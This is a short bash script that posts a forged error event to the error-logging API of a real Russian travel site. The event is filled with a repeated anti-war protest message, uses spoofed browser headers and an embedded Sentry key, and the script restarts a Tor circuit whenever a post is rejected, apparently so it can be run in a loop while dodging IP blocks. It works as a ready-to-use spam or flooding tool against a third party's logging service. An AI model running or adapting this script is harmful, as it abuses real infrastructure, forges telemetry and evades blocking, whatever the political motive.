#!/bin/bash

ID=$(echo $RANDOM | md5sum | head -c 32)
MESSAGE="$(printf 'Stop war against Ukraine! %.0s' {1..50})"
RESULT=$(curl -sk 'https://fronterr.tutu.ru/api/v1/errors' \
           -H 'authority: fronterr.tutu.ru' \
           -H 'access-control-allow-origin: *' \
           -H 'dnt: 1' \
           -H 'sec-ch-ua-mobile: ?0' \
           -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36' \
           -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"' \
           -H 'sec-ch-ua-platform: "Windows"' \
           -H 'content-type: application/json' \
           -H 'accept: */*' \
           -H 'origin: https://www.tutu.ru' \
           -H 'sec-fetch-site: same-site' \
           -H 'sec-fetch-mode: cors' \
           -H 'sec-fetch-dest: empty' \
           -H 'referer: https://www.tutu.ru/' \
           -H 'accept-language: ru-UA,ru;q=0.9' \
           --data-raw '{"url":"https://sentry.tutu.ru/api/53/store/","auth":{"sentry_version":"7","sentry_client":"raven-js/3.27.0","sentry_key":"59a127fa09dd4622bf51774e2dc9c11d"},"data":{"project":"53","logger":"javascript","platform":"javascript","request":{"headers":{"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36"},"url":"https://www.tutu.ru/"},"message":"'"$MESSAGE"'","tags":{"project":"main","page":"'"$MESSAGE"'", "stop":"'"$MESSAGE"'"},"extra":{"session:duration":774602, "stop":"'"$MESSAGE"'"},"breadcrumbs":{"values":[{"timestamp":1648594176.093,"message":"Initmoretavs","level":"info","category":"console"},{"timestamp":1648594176.11,"message":"required 1170","level":"warning","category":"console"},{"timestamp":1648594176.112,"message":"available 1280","level":"warning","category":"console"},{"timestamp":1648594176.288,"category":"ui.click","message":"div.filter_open_button.j-passenger_form_switcher.s-hidden"},{"timestamp":1648594176.712,"type":"http","category":"xhr","data":{"method":"GET","url":"https://story-proxy.tutu.ru/main_page_posts/","status_code":200}},{"timestamp":1648594176.76,"type":"http","category":"xhr","data":{"method":"GET","url":"https://cdn1.tu-tu.ru/images2/order-icons/order.v1.13.1.svg","status_code":200}},{"timestamp":1648594177.217,"type":"http","category":"xhr","data":{"method":"GET","url":"https://bus.tutu.ru/api/v1/geo/suggest/","status_code":200}},{"timestamp":1648594177.355,"type":"http","category":"xhr","data":{"method":"POST","url":"https://frontlog.tutu.ru/api","status_code":200}},{"timestamp":1648594177.535,"type":"http","category":"xhr","data":{"method":"POST","url":"https://www.google-analytics.com/j/collect?v=1&_v=j96&a=537117751&t=pageview&_s=1&dl=https%3A%2F%2Fwww.tutu.ru%2F&ul=ru-ua&de=UTF-8&dt=Tutu.ru%3A%20%D0%90%D0%B2%D0%B8%D0%B0%2C%20%D0%96%D0%94%2C%20%D0%B1%D0%B8%D0%BB%D0%B5%D1%82%D1%8B%20%D0%BD%D0%B0%20…","status_code":200}},{"timestamp":1648594177.566,"type":"http","category":"xhr","data":{"method":"POST","url":"https://stats.g.doubleclick.net/j/collect?t=dc&aip=1&_r=3&v=1&_v=j96&tid=UA-37653253-1&cid=649851493.1648585021&jid=1102639920&gjid=1571857491&_gid=1385846705.1648585021&_u=QCCAgAABAAAAAG~&z=1526880141","status_code":200}},{"timestamp":1648594177.725,"type":"http","category":"xhr","data":{"method":"GET","url":"https://mc.yandex.ru/watch/7294060?wmode=7&page-url=https%3A%2F%2Fwww.tutu.ru%2F&charset=utf-8&browser-info=pv%3A1%3Agdpr%3A14%3Avf%3Auq3ipefhyn2n2dfa4fy%3Afp%3A755%3Afu%3A0%3Aen%3Autf-8%3Ala%3Aru-UA%3Av%3A771%3Acn%3A1%3Adp%3A0%3Als%3A1265854014326%3…","status_code":200}},{"timestamp":1648594178.931,"type":"http","category":"xhr","data":{"method":"POST","url":"/ajax/index.php?Action=usage_log&log=StoriesHasLoaded&page=main","status_code":200}}]},"event_id":"'$ID'"},"options":{"logger":"javascript","ignoreErrors":{},"ignoreUrls":false,"whitelistUrls":{},"includePaths":{},"headers":null,"collectWindowErrors":true,"captureUnhandledRejections":true,"maxMessageLength":0,"maxUrlLength":250,"stackTraceLimit":50,"autoBreadcrumbs":{"xhr":true,"console":true,"dom":true,"location":true,"sentry":true},"instrument":{"tryCatch":true},"sampleRate":1,"sanitizeKeys":[],"maxBreadcrumbs":100}}' \
           --compressed)

if [ "$(echo "$RESULT" | grep -c '{"result":"ok"')" = "0" ]; then
  echo "$RESULT"
  echo "false"
  pkill -sighup tor 2>/dev/null
else
  echo "true"
fi
